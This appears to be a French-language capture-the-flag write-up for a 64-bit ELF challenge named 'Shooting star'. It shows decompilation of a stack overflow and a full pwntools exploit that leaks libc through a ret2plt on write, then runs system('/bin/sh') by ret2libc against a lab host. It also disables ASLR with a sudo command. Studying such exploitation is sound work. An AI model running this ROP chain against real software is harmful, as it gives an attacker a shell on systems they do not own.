\chapter{Shooting star}
\begin{itemize}
    \item {\bf technics}: ret2plt 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}

\section{Analysis}
\subsection{File info}
\begin{verbatim}
$ file shooting_star | tr ',' '\n' |tr ':' '\n'
shooting_star
 ELF 64-bit LSB executable
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 BuildID[sha1]=78179254768c1362423b4d4b124ff480b059febe
 for GNU/Linux 3.2.0
 not stripped
\end{verbatim}

\subsection{Security}
\begin{verbatim}
$ pwntools-pwn checksec --file=./shooting_star
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
\end{verbatim}

\begin{verbatim}
$ echo 0 | sudo tee  /proc/sys/kernel/randomize_va_spac
\end{verbatim}

\subsection{Execution}


\section{static analysis}

\subsection{main}

\subsubsection{Decompilation}
\begin{verbatim}
void main(void)

{
  setup();
  write(1,&DAT_00402288,0x5b);
  star();
  return;
}
\end{verbatim}

\begin{verbatim}
                   DAT_00402288                XREF[1]:   main:00401243(*)
00402288 f0            ??        F0h
00402289 9f            ??        9Fh
0040228a 8c            ??        8Ch
0040228b a0            ??        A0h
0040228c 20 41 20      ds        " A shooting star!!\n1. Make a wish!\n2.
         73 68 6f
         6f 74 69
\end{verbatim}

\subsubsection{Analyse}
donc on a la capacité à récupérer ce qui semble correspondre à une addresse
\verb+0xf09f8ca0+ ou \verb+a08c9ff0+

\subsection{star}

\subsubsection{Decompilation}
\begin{verbatim}
void star(void)

{
  char choice [2];
  undefined wish [64];

  read(0,choice,2);
  if (choice[0] == '1') {
    write(1,&DAT_00402008,3);
    read(0,wish,0x200);
    write(1,"\nMay your wish come true!\n",0x1a);
  }
  else if (choice[0] == '2') {
    write(1,"Isn\'t the sky amazing?!\n",0x18);
  }
  else if (choice[0] == '3') {
    write(1,
          "A star is aastronomical object consisting of a luminous spheroid of
          .. .SNIP. ..
          ide standardized stellar designations.\n"
          ,0x242);
  }
  return;
}
\end{verbatim}

\subsubsection{Desassemblage}
\begin{verbatim}
  0x0000000000401142 <+0>:	push   rbp
   0x0000000000401143 <+1>:	mov    rbp,rsp
   0x0000000000401146 <+4>:	sub    rsp,0x50
   0x000000000040114a <+8>:	lea    rax,[rbp-0x42]            ### choice
   0x000000000040114e <+12>:	mov    edx,0x2
   0x0000000000401153 <+17>:	mov    rsi,rax
   0x0000000000401156 <+20>:	mov    edi,0x0
   0x000000000040115b <+25>:	call   0x401040 <read@plt>
   0x0000000000401160 <+30>:	movzx  eax,BYTE PTR [rbp-0x42]
   0x0000000000401164 <+34>:	cmp    al,0x31               ### comp choice,1
   0x0000000000401166 <+36>:	jne    0x4011ac <star+106>
   0x0000000000401168 <+38>:	mov    edx,0x3
   0x000000000040116d <+43>:	lea    rsi,[rip+0xe94]        # 0x402008
   0x0000000000401174 <+50>:	mov    edi,0x1
   0x0000000000401179 <+55>:	call   0x401030 <write@plt>
   0x000000000040117e <+60>:	lea    rax,[rbp-0x40]        ### wish
   0x0000000000401182 <+64>:	mov    edx,0x200
   0x0000000000401187 <+69>:	mov    rsi,rax
   0x000000000040118a <+72>:	mov    edi,0x0
   0x000000000040118f <+77>:	call   0x401040 <read@plt>
   0x0000000000401194 <+82>:	mov    edx,0x1a
   0x0000000000401199 <+87>:	lea    rsi,[rip+0xe6c]        # 0x40200c
   0x00000000004011a0 <+94>:	mov    edi,0x1
   0x00000000004011a5 <+99>:	call   0x401030 <write@plt>
   0x00000000004011aa <+104>:	jmp    0x4011ea <star+168>
   0x00000000004011ac <+106>:	movzx  eax,BYTE PTR [rbp-0x42]
   0x00000000004011b0 <+110>:	cmp    al,0x32               ### comp choice,2
   0x00000000004011b2 <+112>:	jne    0x4011cc <star+138>
   0x00000000004011b4 <+114>:	mov    edx,0x18
   0x00000000004011b9 <+119>:	lea    rsi,[rip+0xe67]        # 0x402027
   0x00000000004011c0 <+126>:	mov    edi,0x1
   0x00000000004011c5 <+131>:	call   0x401030 <write@plt>
   0x00000000004011ca <+136>:	jmp    0x4011ea <star+168>
   0x00000000004011cc <+138>:	movzx  eax,BYTE PTR [rbp-0x42]
   0x00000000004011d0 <+142>:	cmp    al,0x33               ### comp choice,3
   0x00000000004011d2 <+144>:	jne    0x4011ea <star+168>
   0x00000000004011d4 <+146>:	mov    edx,0x242
   0x00000000004011d9 <+151>:	lea    rsi,[rip+0xe60]        # 0x402040
   0x00000000004011e0 <+158>:	mov    edi,0x1
   0x00000000004011e5 <+163>:	call   0x401030 <write@plt>
   0x00000000004011ea <+168>:	nop
   0x00000000004011eb <+169>:	leave
   0x00000000004011ec <+170>:	ret
\end{verbatim}

\subsubsection{Analyse}

donc buffer overflow.


\section{Exploit}

\subsection{Strategy}

Donc il faudrait faire un :
\begin{itemize}
    \item leak l'addresse de libc avec un \verb+ret2plt+ sur write:
        \begin{itemize}
            \item \verb+rdi+: 1 pour \verb+stdout+ mais on peut le sauter pour
                economiser si besoin grace au print d'après sur \verb+stdout+
                \begin{verbatim}
                $ ropper --file ./shooting_star --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./shooting_star
0x00000000004012cb: pop rdi; ret;
                \end{verbatim}
            \item \verb+rsi+: \verb+got_write+
                \begin{verbatim}
$ ROPgadget --binary ./shooting_star |grep "rsi"
0x00000000004012c9 : pop rsi ; pop r15 ; ret
                \end{verbatim}
            \item \verb+rdx+: \verb+nbytes+. Il n'y a aucun gadget. Cela veut
                dire que l'on va autant que ce qu'il y a dans rdx en toute
                logique \verb+0x1a+ en raison du write qui suit.
        \end{itemize}
    \item un \verb+ret2libc+ pour system
\end{itemize}

Après le code de leak de l'addresse de \verb+write()+ il va falloir rechercher
la version de la libc utilisée. 

les tests sont concluant pour \verb+libc6_2.27-3ubuntu1.4_amd64+

par contre a quoi correspond l'addresse ?
\subsection{Exploit build}


\begin{verbatim}
$ pwntools-pwn template --host 10.10.10.10 --port 10 ./ > pwn-bin.py
\end{verbatim}

\subsubsection{find offset of overflow}
\begin{verbatim}
def find_overflow_offset(p, payload):
    p.sendline(payload)
    p.wait_for_close()
    core = p.corefile
    # in x86 read programm counter value
    #ip_value = core.pc
    # in x64 read pattern from stack pointer since x64 it is not loaded because not a
    # valid ip value
    ip_value = core.read(core.sp, 4)
    ip_offset = cyclic_find(ip_value)
    log.success(f'IP offset at {ip_offset} with value {ip_value}')
    return ip_offset

def find_offset(size):
    g = cyclic_gen()
    p = start_local()
    p.sendafter(b'> ', b'1')
    p.recvuntil(b'>> ')
    offset = find_overflow_offset(p, g.get(size))
    p.close()
    return offset
\end{verbatim}


\subsubsection{Leak libc address}
\begin{verbatim}
def leak_write():
    p_ret2plt_write = flat({
        offset: [
        pop_rsi_r15,
        exe.got['write'],
        0x1,
        exe.plt['write'],
        exe.sym['main']
        ]}
    )
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>>', p_ret2plt_write)
    io.recvuntil(b'May your wish come true!\n')
    leaked = io.recv()
    print(leaked)
    leaked = unpack(leaked.strip()[:6], 'all')
    print(f'write offset : {hex(leaked)}')
    return leaked

def leak_libc(libc_write):
    return leak_write() - libc_write
\end{verbatim}


\subsubsection{ret2libc}
\begin{verbatim}
def ret2libc(binsh, system):
    p_ret2libc = flat({
        offset: [
        pop_rdi,
        binsh,
        system
        ]}
    )
    io.sendline(b'1')
    io.sendlineafter(b'>>', p_ret2libc)
\end{verbatim}

\subsubsection{main}

\begin{verbatim}
# offset = find_offset(100)
# print(f'offset found: {offset}')
# 72
offset = 72
io = start()
context.log_level = 'debug'
pop_rsi_r15 = 0x4012c9
pop_rdi = 0x4012cb
main = 0x401230

libc = exe.libc
if args.LOCAL:
    libc.address = leak_libc(libc.sym['write'])
else:
    libc.address = leak_libc(0x110210)

if args.LOCAL:
    libc_binsh = next(libc.search(b'/bin/sh'))
    libc_system = libc.sym['system']
else:
    libc_binsh = libc.address + 0x1b3e1a
    libc_system = libc.address + 0x04f550

ret2libc(libc_binsh, libc_system)
io.interactive()
\end{verbatim}


